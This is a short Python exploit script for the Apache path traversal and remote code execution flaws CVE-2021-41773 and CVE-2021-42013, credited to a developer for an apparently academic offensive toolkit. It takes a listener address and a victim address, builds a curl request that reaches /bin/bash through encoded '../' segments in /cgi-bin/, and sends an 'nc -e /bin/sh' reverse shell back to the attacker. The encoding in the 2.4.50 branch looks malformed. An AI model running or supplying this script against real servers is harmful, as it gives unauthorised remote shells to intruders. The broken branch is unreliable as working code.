# Apache Webserver CVE-2021-41773/42013 exploit
# developed by Taylor Smith for use in Deakin Detonator Toolkit

import os

l_ip = ""
l_port = "4444"
v_ip = "localhost"
v_port = "8080"
v_version = "2.4.49"

l_ip = input("Please enter the IP you will listen on: ")
l_port = input("Please enter the port you will listen on (Default: 4444): ")
v_ip = input("Please enter the victim IP address (Default: localhost): ")
# The following can be upgraded and replaced with nmap service scan:
v_port = input("Please enter the victim port (Default: 8080): ")
v_version = input("Please enter the victim version (Default: 2.4.49): ")

# Build the command
# 2.4.49
if (v_version == "2.4.49"):
    print("Building RCE exploit for Apache Version 2.4.49")
    cmd = "curl -v 'http://{}:{}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; nc -e /bin/sh {} {}'".format(
        v_ip, v_port, l_ip, l_port)

# 2.4.50
if (v_version == "2.4.50"):
    print("Building RCE exploit for Apache Version 2.4.50")
    cmd = "curl -v 'http://{}:{}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%6/bin/bash' -d 'echo Content-Type: text/plain; echo; nc -e /bin/sh {} {}'".format(
        v_ip, v_port, l_ip, l_port)

# Execute the RCE
os.system(cmd)
print("Successfully exploited, please check your listener for shell")
